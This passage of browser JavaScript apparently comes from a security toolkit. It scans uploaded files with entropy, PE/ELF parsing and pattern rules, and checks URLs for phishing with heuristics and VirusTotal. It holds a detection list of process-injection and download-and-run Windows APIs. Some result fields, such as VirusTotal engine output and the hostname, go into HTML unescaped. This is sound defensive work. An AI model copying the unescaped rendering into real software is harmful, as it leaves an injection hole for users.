  document.getElementById('malwareResult').innerHTML='<div style="text-align:center;color:var(--muted)"><i class="fas fa-shield" style="font-size:40px;opacity:.15;margin-bottom:10px;display:block"></i><p class="text-xs" style="opacity:.5">Upload a file to scan</p></div>';
  toast('Cleared','info');
});

setupDropZone('malwareDropZone','malwareFile',f=>{
  if(f.size>MAX_MALWARE_MB*1024*1024)return toast('Max '+MAX_MALWARE_MB+'MB','error');
  malwareFileRef=f;
  document.getElementById('malwareScanBtn').disabled=false;
  const info=document.getElementById('malwareFileInfo');info.style.display='block';
  info.innerHTML='<div class="glass-sm"><div style="display:flex;align-items:center;gap:8px"><i class="fas fa-file" style="color:var(--accent)"></i><div><p style="font-size:12px;color:var(--text);font-weight:700">'+esc(f.name)+'</p><p style="font-size:10px;color:var(--muted)">'+(f.size/1024).toFixed(1)+' KB · '+esc(f.type||'Unknown type')+'</p></div></div></div>';
  toast('Loaded: '+f.name,'info');
});

$on('malwareScanBtn', 'click',async()=>{
  if(!malwareFileRef)return;
  const btn=document.getElementById('malwareScanBtn');
  const orig=btn.innerHTML;
  btn.disabled=true;

  const vtKey=getVtApiKey();
  const hasVt=!!vtKey;

  // Step 1: Read file
  const arrayBuf=await new Promise((res,rej)=>{
    const r=new FileReader();
    r.onerror=()=>rej(new Error('Read failed'));
    r.onload=e=>res(e.target.result);
    r.readAsArrayBuffer(malwareFileRef);
  }).catch(err=>{toast('Failed to read file: '+err.message,'error');btn.disabled=false;btn.innerHTML=orig;return null;});
  if(!arrayBuf)return;

  // Step 2: Hash + optional VT lookup (primary scanner)
  let vtResult=null;
  if(hasVt){
    btn.innerHTML='<span class="spinner"></span> Hashing & querying VirusTotal...';
    const allBytesForHash=new Uint8Array(arrayBuf);
    const sha256=await sha256Hex(allBytesForHash);
    vtResult=await vtFileLookup(sha256);
  } else {
    btn.innerHTML='<span class="spinner"></span> Scanning...';
  }

  // Step 3: Local heuristics (always run)
  btn.innerHTML='<span class="spinner"></span> Running local analysis...';
  const e={target:{result:arrayBuf}};
  try{
      const allBytes=new Uint8Array(e.target.result);
      // Safe text decode — handle binary files
      let text='';
      try{text=new TextDecoder('utf-8',{fatal:false}).decode(allBytes);}catch{text='';}

      const mode=document.getElementById('malwareScanMode').value;
      const fileType=detectFileType(allBytes);
      const peInfo=parsePEHeader(allBytes);
      const elfInfo=!peInfo?parseELFHeader(allBytes):null;

      // Calculate entropies safely
      const overallEntropy=allBytes.length>0?shannonEntropy(allBytes):0;
      const sliceEnd=Math.min(4096,allBytes.length);
      const sliceStart=Math.max(0,allBytes.length-4096);
      const first4k=allBytes.length>0?shannonEntropy(allBytes.slice(0,sliceEnd)):0;
      const last4k=allBytes.length>0?shannonEntropy(allBytes.slice(sliceStart)):0;
      const sections=mode!=='quick'?analyzePESections(allBytes,peInfo):[];

      const isImageFile = fileType.risk==='safe' || /\.(jpe?g|png|gif|bmp|webp|tiff?|ico|svg)$/i.test(malwareFileRef.name);
      const isArchiveFile = /\.(zip|gz|bz2|xz|zst|7z|rar|tar)$/i.test(malwareFileRef.name) || ['ZIP/JAR/DOCX Archive','GZIP Archive','RAR Archive'].includes(fileType.type);

      // YARA scan — skip text-pattern rules on binary/image files to avoid false positives
      const yaraHits=[];
      const printableRatio=text.length>0?(text.match(/[\x20-\x7E]/g)||[]).length/text.length:0;
      const isLikelyBinary = isImageFile || printableRatio < 0.5;
      for(const rule of YARA_RULES){
        if(mode==='quick'&&rule.severity==='medium')continue;
        // Don't run text-pattern YARA rules against binary/image data — produces garbage matches
        if(isLikelyBinary)continue;
        try{if(text&&rule.pattern.test(text))yaraHits.push(rule);}catch{}
      }

      // Heuristics — image-aware, context-sensitive
      const heuristics=[];

      if(mode!=='quick'){
        // Skip entropy flags for images (JPEG/PNG are naturally high-entropy) and archives
        if(!isImageFile && !isArchiveFile){
          if(overallEntropy>7.2)heuristics.push({name:'Very high entropy ('+overallEntropy.toFixed(2)+'/8.0)',severity:'high',cat:'Packing/Encryption',detail:'Likely packed, encrypted, or compressed payload'});
          else if(overallEntropy>6.5&&(peInfo||elfInfo))heuristics.push({name:'Elevated entropy ('+overallEntropy.toFixed(2)+'/8.0)',severity:'medium',cat:'Obfuscation',detail:'Executable with compressed/obfuscated sections'});
        }

        sections.forEach(sec=>{
          if(sec.entropy>7.0&&sec.isExec)heuristics.push({name:'High-entropy executable section: '+sec.name,severity:'high',cat:'Packing',detail:'Entropy: '+sec.entropy.toFixed(2)+' — likely packed code'});
          if(sec.isWrite&&sec.isExec)heuristics.push({name:'W+X section: '+sec.name,severity:'high',cat:'Shellcode',detail:'Writable+Executable section is a shellcode indicator'});
        });

        // Text heuristics — only on files that are actually text (>60% printable), never on images
        if(text && !isImageFile){
          const printable=(text.match(/[\x20-\x7E]/g)||[]).length;
          const isTextFile=(printable/Math.max(1,text.length))>0.6;

          if(isTextFile){
            const evalCount=(text.match(/\beval\s*\(/g)||[]).length;
            if(evalCount>3)heuristics.push({name:evalCount+'× eval() calls detected',severity:'medium',cat:'Obfuscation',detail:'Multiple eval() suggests dynamic code execution'});

            // Require >2 occurrences or very large blob (images decoded as text produce false B64 hits)
            const b64Matches=(text.match(/[A-Za-z0-9+/]{120,}={0,2}/g)||[]).filter(m=>m.length>120);
            if(b64Matches.length>2)heuristics.push({name:b64Matches.length+' large Base64 blob(s)',severity:'medium',cat:'Obfuscation',detail:'Largest: '+Math.max(...b64Matches.map(m=>m.length))+' chars'});

            const hexObf=(text.match(/\\x[0-9a-fA-F]{2}/g)||[]).length;
            if(hexObf>20)heuristics.push({name:'Heavy hex obfuscation ('+hexObf+' \\xNN)',severity:'high',cat:'Shellcode',detail:'Characteristic of shellcode encoding'});

            const ipMatches=text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g)||[];
            const suspIPs=ipMatches.filter(ip=>{const p=ip.split('.').map(Number);return!((p[0]===192&&p[1]===168)||(p[0]===10)||(p[0]===172&&p[1]>=16&&p[1]<=31)||(p[0]===127)||(p[0]===0));});
            if(suspIPs.length>0)heuristics.push({name:suspIPs.length+' external IP(s)',severity:'medium',cat:'Network Indicator',detail:suspIPs.slice(0,3).join(', ')+(suspIPs.length>3?'...':'')});

            const urlMatches=text.match(/https?:\/\/[^\s"'<>]{10,}/g)||[];
            if(urlMatches.length>0)heuristics.push({name:urlMatches.length+' URL(s)',severity:'low',cat:'Network Indicator',detail:urlMatches.slice(0,2).join(', ')+(urlMatches.length>2?'...':'')});
          }

          if(mode==='deep'&&peInfo){
            const suspAPIs=['VirtualAlloc','WriteProcessMemory','CreateRemoteThread','SetWindowsHookEx','URLDownloadToFile','WinExec','ShellExecute','RegSetValue','InternetOpen','LoadLibraryA'];
            const found=suspAPIs.filter(fn=>text.includes(fn));
            if(found.length>0)heuristics.push({name:'Suspicious API imports ('+found.length+')',severity:'high',cat:'API Abuse',detail:found.slice(0,5).join(', ')});
          }
        }
      }

      const allFindings=[...yaraHits,...heuristics];
      let score=0;
      allFindings.forEach(f=>{if(f.severity==='critical')score+=40;else if(f.severity==='high')score+=25;else if(f.severity==='medium')score+=10;else score+=5;});
      // Only add entropy score for non-image, non-archive executables
      if(overallEntropy>7.2 && !isImageFile && !isArchiveFile && (peInfo||elfInfo))score+=15;
      // Safe-typed files (images) don't add base risk score
      if(fileType.risk==='high')score+=20;
      else if(fileType.risk==='medium'&&!isImageFile)score+=5;
      score=Math.min(score,100);

      // Integrate VT result into score (VT is authoritative — override local score if VT found)
      if(vtResult&&vtResult.found){
        if(vtResult.malicious>=5)score=Math.max(score,85);
        else if(vtResult.malicious>=2)score=Math.max(score,65);
        else if(vtResult.malicious>=1)score=Math.max(score,45);
        else if(vtResult.suspicious_count>=2)score=Math.max(score,30);
        else if(vtResult.malicious===0&&vtResult.harmless>0&&allFindings.length===0)score=Math.min(score,5);
      }
      const overallRisk=score>=60?'MALICIOUS':score>=30?'SUSPICIOUS':score>=10?'LOW RISK':'CLEAN';
      const riskColor=score>=60?'var(--danger)':score>=30?'var(--warn)':score>=10?'var(--cyan)':'var(--accent)';
      const riskIcon=score>=60?'fa-skull-crossbones':score>=30?'fa-triangle-exclamation':score>=10?'fa-circle-info':'fa-shield-halved';

      const sevColor=s=>s==='critical'?'var(--danger)':s==='high'?'var(--danger)':s==='medium'?'var(--warn)':'var(--cyan)';
      const sevIcon=s=>s==='critical'?'fa-skull-crossbones':s==='high'?'fa-circle-xmark':s==='medium'?'fa-triangle-exclamation':'fa-circle-info';
      const sevBg=s=>s==='critical'||s==='high'?'sev-high':s==='medium'?'sev-medium':'sev-low';

      const rd=document.getElementById('malwareResult');
      rd.style.display='block';rd.style.alignItems='flex-start';
      const vtScannerLabel = hasVt ? (vtResult&&vtResult.found ? ' · VT: '+vtResult.malicious+'/'+vtResult.total+' engines' : vtResult&&!vtResult.found ? ' · VT: Not in DB' : ' · VT: Query failed') : ' · No VT key';
      rd.innerHTML='<div style="width:100%">'+
        // Summary header
        '<div class="glass-sm mb-3" style="border-color:'+riskColor+'30"><div style="display:flex;align-items:center;gap:12px;margin-bottom:10px"><i class="fas '+riskIcon+'" style="color:'+riskColor+';font-size:28px"></i><div><p style="font-weight:800;font-size:18px;color:'+riskColor+'">'+overallRisk+'</p><p style="font-size:11px;color:var(--muted)">Risk Score: '+score+'/100 · '+allFindings.length+' local finding(s) · '+mode.toUpperCase()+' mode'+vtScannerLabel+'</p></div></div><div class="progress-bar"><div class="progress-fill" style="width:'+score+'%;background:'+riskColor+'"></div></div></div>'+
        // VirusTotal block (primary scanner — shown first)
        renderVtBlock(vtResult)+
        // Stats grid
        '<div class="grid grid-cols-4 gap-2 mb-3">'+[['YARA Hits',yaraHits.length,'var(--danger)'],['Heuristics',heuristics.length,'var(--warn)'],['Entropy',overallEntropy.toFixed(2),overallEntropy>7?'var(--danger)':overallEntropy>6?'var(--warn)':'var(--accent)'],['Score',score+'/100',riskColor]].map(([l,v,c])=>'<div class="glass-sm text-center"><div style="font-size:16px;font-weight:800;color:'+c+';font-family:\'JetBrains Mono\'">'+v+'</div><div style="font-size:9px;color:var(--muted)">'+l+'</div></div>').join('')+'</div>'+
        // File info
        '<div class="glass-sm mb-3"><p style="font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">File Analysis</p>'+
        [['Filename',malwareFileRef.name],['Size',(malwareFileRef.size/1024).toFixed(2)+' KB ('+malwareFileRef.size+' bytes)'],['Detected Type',fileType.type],['Overall Entropy',overallEntropy.toFixed(4)+'/8.0 '+(overallEntropy>7.2?'⚠ VERY HIGH':overallEntropy>6.5?'⚠ HIGH':'✓ Normal')],['First 4K Entropy',first4k.toFixed(4)],['Last 4K Entropy',last4k.toFixed(4)],...(peInfo?[['PE Architecture',peInfo.arch],['PE Type',(peInfo.isDLL?'DLL':peInfo.isExe?'EXE':'Unknown PE')+(peInfo.is64?' (64-bit)':' (32-bit)')],['PE Sections',peInfo.numSections+' sections'],['Compile Time',peInfo.timestamp]]:
        elfInfo?[['ELF Class',elfInfo.cls],['ELF Type',elfInfo.type],['ELF Machine',elfInfo.machine]]:
        [])
      ].map(([k,v])=>'<div style="display:flex;gap:8px;padding:4px 0;border-bottom:1px solid var(--border);font-size:10px"><span style="color:var(--muted);min-width:130px;flex-shrink:0;font-family:\'JetBrains Mono\',monospace">'+k+'</span><span style="color:var(--text)">'+String(v).replace(/</g,'&lt;').substring(0,200)+'</span></div>').join('')+
        '</div>'+
        // PE Sections table
        (sections.length>0?'<div class="glass-sm mb-3"><p style="font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">PE Sections</p><table class="data-table" style="width:100%"><thead><tr><th>Name</th><th>Size</th><th>Entropy</th><th>Flags</th></tr></thead><tbody>'+sections.map(sec=>'<tr><td style="font-family:\'JetBrains Mono\',monospace">'+sec.name+'</td><td>'+(sec.rawSize/1024).toFixed(1)+' KB</td><td style="color:'+(sec.entropy>7?'var(--danger)':sec.entropy>6?'var(--warn)':'var(--accent)')+'">'+sec.entropy.toFixed(3)+'</td><td>'+(sec.isExec?'<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:rgba(255,51,102,0.1);color:var(--danger)">EXEC</span>':'')+(sec.isWrite?'<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:rgba(255,170,0,0.1);color:var(--warn);margin-left:3px">WRITE</span>':'')+'</td></tr>').join('')+'</tbody></table></div>':'') +
        // YARA hits
        (yaraHits.length>0?'<h4 style="font-size:12px;font-weight:700;color:var(--text);margin-bottom:8px"><i class="fas fa-crosshairs" style="color:var(--danger)"></i> Signature Matches ('+yaraHits.length+')</h4>'+yaraHits.map(f=>'<div class="alert-item '+sevBg(f.severity)+'"><i class="fas '+sevIcon(f.severity)+'" style="color:'+sevColor(f.severity)+';font-size:13px;flex-shrink:0;margin-top:1px"></i><div><p style="font-weight:700;font-size:12px;color:var(--text)">'+f.name+'</p><div style="display:flex;gap:4px;margin-top:2px"><span style="font-size:9px;padding:1px 6px;border-radius:4px;background:rgba(168,85,247,0.1);color:var(--purple);border:1px solid rgba(168,85,247,0.2)">'+f.cat+'</span><span style="font-size:9px;padding:1px 6px;border-radius:4px;background:'+(f.severity==='critical'||f.severity==='high'?'rgba(255,51,102,0.1)':'rgba(255,170,0,0.1)')+';color:'+sevColor(f.severity)+'">'+f.severity.toUpperCase()+'</span></div></div></div>').join(''):'') +
        // Heuristics
        (heuristics.length>0?'<h4 style="font-size:12px;font-weight:700;color:var(--text);margin:12px 0 8px"><i class="fas fa-microscope" style="color:var(--warn)"></i> Heuristic Findings ('+heuristics.length+')</h4>'+heuristics.map(f=>'<div class="alert-item '+sevBg(f.severity)+'"><i class="fas fa-triangle-exclamation" style="color:'+sevColor(f.severity)+';font-size:13px;flex-shrink:0;margin-top:1px"></i><div><p style="font-weight:700;font-size:12px;color:var(--text)">'+esc(f.name)+'</p>'+(f.detail?'<p style="font-size:10px;color:var(--muted)">'+esc(f.detail)+'</p>':'')+'<span style="font-size:9px;padding:1px 6px;border-radius:4px;background:rgba(0,212,255,0.08);color:var(--cyan);border:1px solid rgba(0,212,255,0.2)">'+f.cat+'</span></div></div>').join(''):'') +
        // Clean result
        (allFindings.length===0?'<div class="glass-sm" style="text-align:center;padding:20px"><i class="fas fa-check-circle" style="color:var(--accent);font-size:28px;margin-bottom:8px;display:block"></i><p style="color:var(--accent);font-weight:700">No threats detected</p><p style="color:var(--muted);font-size:11px;margin-top:4px">Entropy: '+overallEntropy.toFixed(3)+' · Type: '+fileType.type+'</p></div>':'') +
        '<div class="glass-sm mt-3" style="border-color:rgba(255,170,0,0.2)"><p style="font-size:10px;color:var(--warn)"><i class="fas fa-info-circle"></i> Browser-based scanner: entropy, PE/ELF parsing & YARA-like rules. For production, use VirusTotal, ClamAV, or real YARA.</p></div>'+
        '</div>';

      addStats(1,malwareFileRef.size);
      logActivity('Malware: '+malwareFileRef.name+' → '+overallRisk+' ('+allFindings.length+' findings)');
      toast('Scan: '+overallRisk,score>=30?'warn':'success');
  }catch(scanErr){
      document.getElementById('malwareResult').innerHTML='<div style="padding:20px"><p style="color:var(--danger);font-weight:700"><i class="fas fa-circle-xmark"></i> Scan error: '+esc(scanErr.message)+'</p></div>';
      toast('Scan failed: '+scanErr.message,'error');
    }
    btn.disabled=false;btn.innerHTML=orig;
  }
);

// =============================================
// URL DETECTOR — VirusTotal API + Heuristics
// =============================================
// vtApiKey removed — always read fresh from localStorage via getVtApiKey()
let urlMode = 'both';

// Load saved API key — null-safe helpers (these inline elements may not exist in all layouts)
const _el = id => document.getElementById(id);
const _elSet = (id, prop, val) => { const e = _el(id); if(e) e[prop] = val; };
const _elOn = (id, ev, fn) => { const e = _el(id); if(e) e.addEventListener(ev, fn); };
const _elHtml = (id, html) => { const e = _el(id); if(e) e.innerHTML = html; };

// Populate field from live localStorage on page load
(function(){
  const key = getVtApiKey();
  if(key){
    _elSet('vtApiKey','value', key);
    _elHtml('vtKeyStatus', '<i class="fas fa-check-circle" style="color:var(--accent)"></i> API key saved · Ready for VirusTotal scans');
  }
})();

_elOn('vtSaveKeyBtn', 'click', () => {
  const inp = _el('vtApiKey'); const key = inp ? inp.value.trim() : '';
  if(!key) return toast('Enter an API key','warn');
  localStorage.setItem('vt-api-key', key);
  _elHtml('vtKeyStatus', '<i class="fas fa-check-circle" style="color:var(--accent)"></i> API key saved locally · Ready for VirusTotal scans');
  toast('API key saved!','success');
});

_elOn('vtClearKeyBtn', 'click', () => {
  localStorage.removeItem('vt-api-key');
  _elSet('vtApiKey','value','');
  _elHtml('vtKeyStatus', '<i class="fas fa-circle-info"></i> Get a free API key at <a href="https://www.virustotal.com/gui/join-us" target="_blank" style="color:var(--cyan)">virustotal.com</a>');
  toast('Key cleared','info');
});

$on('urlModeTabs', 'click', e => {
  const btn = e.target.closest('[data-url-mode]');
  if(!btn) return;
  document.querySelectorAll('#urlModeTabs .tab').forEach(t=>t.classList.remove('active'));
  btn.classList.add('active');
  urlMode = btn.dataset.urlMode;
});

document.getElementById('urlExamples')?.querySelectorAll('[data-url]').forEach(btn => {
  btn.addEventListener('click', () => { document.getElementById('urlInput').value = btn.dataset.url; });
});

$on('clearURLBtn', 'click', () => {
  document.getElementById('urlInput').value = '';
  document.getElementById('urlResult').innerHTML = '<div style="text-align:center;color:var(--muted)"><i class="fas fa-link" style="font-size:40px;opacity:.15;margin-bottom:10px;display:block"></i><p class="text-xs" style="opacity:.5">Enter a URL to analyze</p></div>';
  toast('Cleared','info');
});

const SUSPICIOUS_TLDS=['.ru','.tk','.xyz','.top','.gq','.ml','.cf','.ga','.pw','.cc'];
const PHISHING_KEYWORDS=['paypal','amazon','google','apple','microsoft','facebook','instagram','login','secure','account','verify','update','signin','banking','confirm','wallet','crypto'];
const LEGIT_DOMAINS=['google.com','amazon.com','paypal.com','microsoft.com','apple.com','facebook.com','github.com','cloudflare.com','youtube.com','twitter.com','instagram.com'];

function analyzeURLHeuristic(rawUrl) {
  let url;
  try { url = new URL(rawUrl); } catch { throw new Error('Invalid URL — include protocol (https://...)'); }
  const findings = []; let score = 0;

  if(url.protocol !== 'https:') { findings.push({type:'bad',label:'No HTTPS',detail:'Connection not encrypted',sev:'high'}); score += 30; }
  else { findings.push({type:'ok',label:'HTTPS Enabled',detail:'Encrypted connection',sev:'low'}); }

  SUSPICIOUS_TLDS.forEach(tld => { if(url.hostname.endsWith(tld)) { findings.push({type:'bad',label:'Suspicious TLD: '+tld,detail:'Commonly used for malicious sites',sev:'high'}); score += 25; } });

  if(/^(\d{1,3}\.){3}\d{1,3}$/.test(url.hostname)) { findings.push({type:'bad',label:'IP Address URL',detail:'Raw IPs are rarely used by legitimate sites',sev:'high'}); score += 35; }

  const hostBase = url.hostname.replace(/^www\./, '');
  PHISHING_KEYWORDS.forEach(kw => {
    if(hostBase.includes(kw) && !LEGIT_DOMAINS.some(d => url.hostname === d || url.hostname.endsWith('.' + d))) {
      findings.push({type:'bad',label:'Brand Impersonation: "'+kw+'"',detail:'Brand keyword on non-official domain',sev:'high'}); score += 40;
    }
  });

  // Homograph / typosquat check
  const cleaned = hostBase.replace(/0/g,'o').replace(/1/g,'l').replace(/3/g,'e').replace(/4/g,'a').replace(/5/g,'s').replace(/6/g,'b').replace(/8/g,'b');
  if(cleaned !== hostBase && PHISHING_KEYWORDS.some(k => cleaned.split('.')[0].includes(k))) {
    findings.push({type:'bad',label:'Character Substitution',detail:'Digits replacing letters to mimic known brands',sev:'high'}); score += 35;
  }

  const parts = url.hostname.split('.');
  if(parts.length > 4) { findings.push({type:'warn',label:'Excessive Subdomains ('+parts.length+')',detail:'Multiple subdomains are common in phishing',sev:'medium'}); score += 15; }

  if(rawUrl.length > 100) { findings.push({type:'warn',label:'Long URL ('+rawUrl.length+' chars)',detail:'Overly long URLs often obscure malicious destinations',sev:'low'}); score += 10; }

  const params = [...url.searchParams.keys()];
  if(params.some(p => ['redirect','url','r','goto','target','return','next'].includes(p.toLowerCase()))) {
    findings.push({type:'bad',label:'Open Redirect Parameter',detail:'Could redirect to malicious page',sev:'high'}); score += 30;
  }

  if(/\.(netlify\.app|vercel\.app|github\.io|pages\.dev|web\.app|glitch\.me)$/.test(url.hostname)) {
    findings.push({type:'warn',label:'Free Hosting Platform',detail:'Often used to host short-lived phishing pages',sev:'medium'}); score += 15;
  }

  // Punycode / IDN homograph
  if(url.hostname.includes('xn--')) {
    findings.push({type:'bad',label:'Punycode / IDN Domain',detail:'May be a homograph attack using look-alike Unicode chars',sev:'high'}); score += 30;
  }

  score = Math.min(score, 100);
  const risk = score >= 60 ? 'HIGH' : score >= 30 ? 'MEDIUM' : 'LOW';
  return { url, hostname: url.hostname, protocol: url.protocol, pathname: url.pathname, params: [...url.searchParams.entries()], findings, risk, riskScore: score };
}

async function scanWithVirusTotal(rawUrl) {
  const vtApiKey = getVtApiKey();
  if(!vtApiKey) return null;
  try {
    // Submit URL for analysis
    const submitResp = await fetch('https://www.virustotal.com/api/v3/urls', {
      method: 'POST',
      headers: { 'x-apikey': vtApiKey, 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'url=' + encodeURIComponent(rawUrl)
    });
    if(!submitResp.ok) {
      if(submitResp.status === 401) throw new Error('Invalid API key');
      if(submitResp.status === 429) throw new Error('Rate limit exceeded (4/min free tier)');
      throw new Error('VT API error: ' + submitResp.status);
    }
    const submitData = await submitResp.json();
    const analysisId = submitData.data?.id;
    if(!analysisId) throw new Error('No analysis ID returned');

    // Poll for results (max 3 attempts)
    for(let attempt = 0; attempt < 3; attempt++) {
      await new Promise(r => setTimeout(r, 2000));
      const resultResp = await fetch('https://www.virustotal.com/api/v3/analyses/' + analysisId, {
        headers: { 'x-apikey': vtApiKey }
      });
      if(!resultResp.ok) continue;
      const resultData = await resultResp.json();
      const status = resultData.data?.attributes?.status;
      if(status === 'completed') return resultData.data.attributes;
    }

    // Fallback: try URL lookup directly
    const urlId = btoa(rawUrl).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
    const lookupResp = await fetch('https://www.virustotal.com/api/v3/urls/' + urlId, {
      headers: { 'x-apikey': vtApiKey }
    });
    if(!lookupResp.ok) return null;
    const lookupData = await lookupResp.json();
    return lookupData.data?.attributes || null;
  } catch(e) {
    throw e;
  }
}

function renderVTResults(vtData, heuristicResult, rawUrl) {
  const rd = document.getElementById('urlResult');
  rd.style.display = 'block'; rd.style.alignItems = 'flex-start';

  let vtHtml = '';
  if(vtData) {
    const stats = vtData.last_analysis_stats || {};
    const malicious = stats.malicious || 0;
    const suspicious = stats.suspicious || 0;
    const undetected = stats.undetected || 0;
    const total = malicious + suspicious + undetected + (stats.harmless || 0) + (stats.timeout || 0);
    const vtRiskColor = malicious > 5 ? 'var(--danger)' : malicious > 0 || suspicious > 2 ? 'var(--warn)' : 'var(--accent)';
    const vtStatus = malicious > 5 ? 'MALICIOUS' : malicious > 0 ? 'FLAGGED' : suspicious > 2 ? 'SUSPICIOUS' : 'CLEAN';
    const circumference = 2 * Math.PI * 54;
    const dashOffset = circumference - (malicious / Math.max(total, 1)) * circumference;

    // Engine results
    const engines = vtData.last_analysis_results || {};
    const engineEntries = Object.entries(engines).slice(0, 40);
    const detectedEngines = engineEntries.filter(([,r]) => r.category === 'malicious' || r.category === 'suspicious');
    const cleanEngines = engineEntries.filter(([,r]) => r.category === 'harmless' || r.category === 'undetected');

    vtHtml = `
    <div class="glass-sm mb-3" style="border-color:${vtRiskColor}30">
      <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap">
        <div class="vt-gauge">
          <div class="vt-ring">
            <svg viewBox="0 0 120 120" width="120" height="120">
              <circle cx="60" cy="60" r="54" fill="none" stroke="rgba(100,116,139,0.2)" stroke-width="8"/>
              <circle cx="60" cy="60" r="54" fill="none" stroke="${vtRiskColor}" stroke-width="8"
                stroke-dasharray="${circumference}" stroke-dashoffset="${dashOffset}"
                stroke-linecap="round" style="transition:stroke-dashoffset 1s ease"/>
            </svg>
            <div class="vt-ring-inner">
              <div class="count" style="color:${vtRiskColor}">${malicious}</div>
              <div class="label">/ ${total} flagged</div>
            </div>
          </div>
          <p style="font-weight:800;color:${vtRiskColor};font-size:14px">${vtStatus}</p>
        </div>
        <div style="flex:1;min-width:160px">
          <p style="font-size:13px;font-weight:700;color:var(--text);margin-bottom:6px">VirusTotal (${total} engines)</p>
          ${[['Malicious', malicious, 'var(--danger)'], ['Suspicious', suspicious, 'var(--warn)'], ['Clean', undetected + (stats.harmless||0), 'var(--accent)']].map(([l,v,c])=>
            `<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border);font-size:11px"><span style="color:var(--muted)">${l}</span><span style="color:${c};font-weight:700;font-family:'JetBrains Mono',monospace">${v}</span></div>`
          ).join('')}
          ${vtData.categories ? '<p style="font-size:10px;color:var(--muted);margin-top:6px">Categories: '+Object.values(vtData.categories).slice(0,3).join(', ')+'</p>' : ''}
        </div>
      </div>
    </div>
    ${detectedEngines.length > 0 ? `<div class="glass-sm mb-3"><p style="font-size:10px;font-weight:700;color:var(--danger);margin-bottom:8px"><i class="fas fa-circle-xmark"></i> Flagged by ${detectedEngines.length} engine(s)</p><div class="vt-engine-grid">${detectedEngines.slice(0,20).map(([name,r])=>'<div class="vt-engine-row detected"><div class="vt-dot" style="background:var(--danger)"></div><span style="font-weight:700;font-size:11px;flex:1">'+name+'</span><span style="font-size:9px;color:var(--danger)">'+r.result+'</span></div>').join('')}</div></div>` : ''}
    ${cleanEngines.length > 0 ? `<div class="glass-sm mb-3"><p style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px"><i class="fas fa-shield-halved"></i> Clean by ${Math.min(cleanEngines.length,20)} engine(s) (sample)</p><div class="vt-engine-grid">${cleanEngines.slice(0,12).map(([name])=>'<div class="vt-engine-row clean"><div class="vt-dot" style="background:var(--accent)"></div><span style="font-size:11px;flex:1">'+name+'</span><span style="font-size:9px;color:var(--accent)">Clean</span></div>').join('')}</div></div>` : ''}`;
  }

  // Heuristic section
  let heurHtml = '';
  if(heuristicResult) {
    const h = heuristicResult;
    const rc = h.risk === 'HIGH' ? 'var(--danger)' : h.risk === 'MEDIUM' ? 'var(--warn)' : 'var(--accent)';
    heurHtml = `
    <div class="glass-sm mb-3" style="border-color:${rc}30">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
        <i class="fas ${h.risk==='HIGH'?'fa-circle-xmark':h.risk==='MEDIUM'?'fa-triangle-exclamation':'fa-check-circle'}" style="color:${rc};font-size:20px"></i>
        <div style="flex:1">
          <p style="font-weight:800;font-size:13px;color:${rc}">Heuristic Risk: ${h.risk} (${h.riskScore}/100)</p>
          <p style="font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted)">${h.hostname}</p>
        </div>
      </div>
      <div class="progress-bar"><div class="progress-fill" style="width:${h.riskScore}%;background:${rc}"></div></div>
    </div>
    <div class="glass-sm mb-3">
      <p style="font-size:10px;font-weight:700;color:var(--muted);margin-bottom:8px">URL BREAKDOWN</p>
      ${[['Protocol',h.protocol,h.protocol==='https:'?'var(--accent)':'var(--danger)'],['Host',h.hostname,null],['Path',h.pathname||'/',null],['Params',h.params.length?h.params.map(([k,v])=>k+'='+v).join(', '):'None',null]].map(([l,v,c])=>'<div style="display:flex;gap:8px;padding:4px 0;border-bottom:1px solid var(--border);font-size:11px"><span style="color:var(--muted);width:60px;flex-shrink:0">'+l+'</span><span style="font-family:\'JetBrains Mono\',monospace;color:'+(c||'var(--text)')+'">'+String(v).replace(/</g,'&lt;')+'</span></div>').join('')}
    </div>
    <h4 style="font-size:12px;font-weight:700;color:var(--text);margin-bottom:8px">Heuristic Checks (${h.findings.length})</h4>
    ${h.findings.map(f=>'<div class="alert-item sev-'+(f.type==='bad'?'high':f.type==='warn'?'medium':'low')+'"><i class="fas '+(f.type==='ok'?'fa-check-circle':f.type==='warn'?'fa-triangle-exclamation':'fa-circle-xmark')+'" style="color:'+(f.type==='ok'?'var(--accent)':f.type==='warn'?'var(--warn)':'var(--danger)')+';font-size:13px;flex-shrink:0;margin-top:1px"></i><div><p style="font-weight:700;font-size:12px;color:var(--text)">'+esc(f.label)+'</p><p style="font-size:10px;color:var(--muted)">'+esc(f.detail)+'</p></div></div>').join('')}`;
  }

  rd.innerHTML = '<div style="width:100%">' + vtHtml + heurHtml + '</div>';
}

$on('urlAnalyzeBtn', 'click', async () => {
  const rawUrl = document.getElementById('urlInput').value.trim();
  if(!rawUrl) return toast('Enter a URL','warn');

  const btn = document.getElementById('urlAnalyzeBtn');
  const orig = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Analyzing...';

  const rd = document.getElementById('urlResult');
  rd.style.display = 'block'; rd.style.alignItems = 'flex-start';
  rd.innerHTML = '<div style="padding:30px;text-align:center"><span class="spinner"></span><p style="color:var(--muted);margin-top:10px;font-size:12px">Analyzing URL' + (urlMode !== 'heuristic' && getVtApiKey() ? ' with VirusTotal...' : ' with heuristics...') + '</p></div>';

  let heuristicResult = null, vtData = null, vtError = null;

  // Heuristic analysis
  if(urlMode === 'both' || urlMode === 'heuristic') {
    try { heuristicResult = analyzeURLHeuristic(rawUrl); }
    catch(e) { toast(e.message, 'error'); btn.disabled = false; btn.innerHTML = orig; return; }
  }

  // VirusTotal scan
  if((urlMode === 'both' || urlMode === 'vt') && getVtApiKey()) {
    try {
      vtData = await scanWithVirusTotal(rawUrl);
    } catch(e) {
      vtError = e.message;
      toast('VT error: ' + e.message, 'error');
    }
  } else if((urlMode === 'both' || urlMode === 'vt') && !getVtApiKey()) {
    toast('No API key — running heuristics only','warn');
    if(!heuristicResult) {
